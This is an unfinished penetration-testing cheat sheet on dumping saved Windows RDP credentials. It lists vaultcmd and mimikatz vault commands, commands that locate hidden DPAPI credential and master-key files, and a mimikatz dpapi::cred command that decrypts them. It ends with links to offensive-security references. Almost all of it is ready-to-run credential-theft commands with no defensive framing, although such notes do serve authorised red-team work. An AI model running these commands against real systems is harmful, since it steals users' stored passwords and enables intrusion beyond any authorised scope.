# Dump RDP Credentials

TODO: Fill the rest (refer to the links)

## Conditions

- `.rdp` file extensions are present in the target's workstation.

## List Vault

`C:\> vaultcmd /listcreds:"Windows Credentials" /all`

`mimikatz # vault::list`

## Credential Files

```
C:\> dir /a:h C:\Users\%username%\AppData\Local\Microsoft\Credentials

C:\> dir /a:h C:\Users\%username%\AppData\Roaming\Microsoft\Credentials

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`C:\> dir C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SUID>\<GUID>`

```
mimikatz # dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\ /master-key:
```

---
## References

- [HackTricks: DPAPI - Extracting Passwords](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)

- [Hacking Articles: Windows Credential Manager](https://www.hackingarticles.in/credential-dumping-windows-credential-manager/)

- [The Hacker Recipes: DPAPI Protected Secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)

- [Pentestlab Blog: Dumping RDP Credentials](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)